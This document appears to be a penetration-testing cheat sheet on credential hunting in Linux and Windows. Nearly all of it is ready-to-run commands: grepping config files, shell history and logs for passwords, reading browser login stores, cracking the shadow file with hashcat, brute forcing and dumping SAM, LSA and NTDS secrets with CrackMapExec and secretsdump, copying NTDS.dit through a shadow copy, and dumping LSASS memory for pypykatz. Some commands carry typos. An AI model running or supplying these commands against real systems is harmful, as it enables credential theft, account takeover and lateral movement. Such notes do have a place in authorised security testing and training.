# Credential hunting

### Linux

<pre class="language-bash"><code class="lang-bash"># Search for config files
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

# Credentials in config files
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
<strong>
</strong><strong># Config files
</strong>find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null

<strong># Database
</strong>for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

# Notes
find /home/* -type f -name "*.txt" -o ! -name "*.*"

# Scrips
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
</code></pre>

#### More to look for

```bash
# Cronbjos
cat /etc/crontab
ls -la /etc/cron.*/

# History
history
tail -n5 /home/*/.bash*

# Logs
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

# Firefox
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```

#### Cracking shadow file

```bash
# Unshadow files
unshadow /tmp/passwd /tmp/shadow > /tmp/

# Crack with hashcat
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

### Windows

```bash
# Runas commands as other user
runas /savecred /user:zencorp\user "whoami"

# findstr
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

# Powershell find history file location and open
(Get-PSReadLineOption).HistorySavePath
gc (Get-PSReadLineOption).HistorySavePath

# Powershell history
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

#### Automated tools

```bash
# Crackmapexec
crackmapexec smb 172.16.10.10 --users
crackmapexec smb 172.16.10.10 -u mczen -p password --users
crackmapexe smb 192.168.1.1 -u username -p password --sam
crackmapexe smb 192.168.1.1 -u username -p password --lsa
crackmapexe smb 192.168.1.1 -u username -p password --ntds-history

# Crackmapexec brute force
sudo crackmapexec smb 172.16.10.10 -u users.txt -p password | grep +

# Enum4linux
enum4linux -U 172.16.10.10 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]

# Using meterpreter
hashdump

# Lazagne
./lazagne.exe -all

# Rubeus
./rubeus.exe -h
```

SAM

```bash
# Copy SAM file
reg.exe save hklm\sam C:\sam.save
# Copy SYSTEM file
reg.exe save hklm\system C:\system.save

# Copy files to host run secretsdump
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -system system.save LOCAL
```

#### NTDS.DIT

```bash
# Create a new file pwn.dsh
set context persistent nowriters
add volume c: alias raj
create
expose %raj% z:

# Make a copy of drive
diskshadow /s pwn.dsh

# Copy NTDS.DIT file
robocopy /b z:\windows\ntds . ntds.dit

# The dump on host
python secretsdump.py -ntds ntds.dit -system system -hashes lmhash:nthash LOCAL
```

#### LSASS

```powershell
# DUMP LSASS memory
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

# pypykatz
pypykatz lsa minidump /home/kali/lsass.dmp 
```

#### Decrypt powershell credentials

```bash
# Store path
$credential = Import-Clixml -Path 'C:\code\passwd.xml'
# Get username
$credential.GetNetworkCredential().username
# Get password
$credential.GetNetworkCredential().password
```

### Search strings

```bash
# Example 1
findstr /si password *.xml *.ini *.txt *.config
# Example 2
findstr /spin "password" *.*
# Use powershell
select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password

# File extensions
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
# File extenions
where /R C:\ *.config
# File extenions powershell
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore

```

### Files of interest

```
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```
